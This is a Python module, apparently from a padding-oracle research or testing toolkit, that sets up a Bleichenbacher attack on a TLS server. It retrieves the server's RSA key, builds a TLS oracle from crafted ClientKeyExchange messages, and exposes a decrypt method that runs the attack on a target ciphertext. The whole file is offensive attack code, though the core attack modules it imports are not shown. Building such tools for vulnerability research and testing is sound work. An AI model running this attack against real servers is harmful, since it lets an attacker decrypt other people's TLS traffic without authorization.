
import legacy_attack.config as config
import tls_transport as tls_oracle
from tls_transport import get_rsa_from_server, configure_oracle, make_cke_prefix
import legacy_attack.bleichenbacher as bleichenbacher


import json

class BleichenbacherTLSAttack:

    def __init__(self, oracle_constructor, config, rsa):
        self.oracle_constructor = oracle_constructor
        self.config = config
        self.rsa = rsa
        self.attack = bleichenbacher.CapolBleichenAttack(config)

    def decrypt(self, encrypted):
        oracle = self.oracle_constructor(self.config, encrypted, self.rsa)
        secret, stats = self.attack.attack(self.rsa, oracle)
        open("results.json", "w").write(json.dumps(stats.to_dict()))
        return secret

def bleichenbacher_attack_tls(ip: str, port: int, quiet: bool = False, benchmark: bool = False, early_abort: bool = False, test_oracle: bool = False, parallel: bool = False):
    rsa = get_rsa_from_server(ip, port)
    conf = config.get_config_tls_parallel(rsa) if parallel else config.get_config_tls(rsa)

    cke_2nd_prefix = make_cke_prefix(rsa)

    def construct_oracle(conf, encrypted, rsa):
        oracle = tls_oracle.TLSOracle(conf.oracle, ip, port, tls_oracle.ch, cke_2nd_prefix, rsa.e, rsa.N, encrypted)
        configure_oracle(oracle, rsa, quiet=True, test=test_oracle)
        return oracle

    if not quiet:
        oracle = tls_oracle.TLSOracle(conf.oracle, ip, port, tls_oracle.ch, cke_2nd_prefix, rsa.e, rsa.N, 0)
        configure_oracle(oracle, rsa, quiet=False, test=test_oracle)

    return BleichenbacherTLSAttack(construct_oracle, conf, rsa)
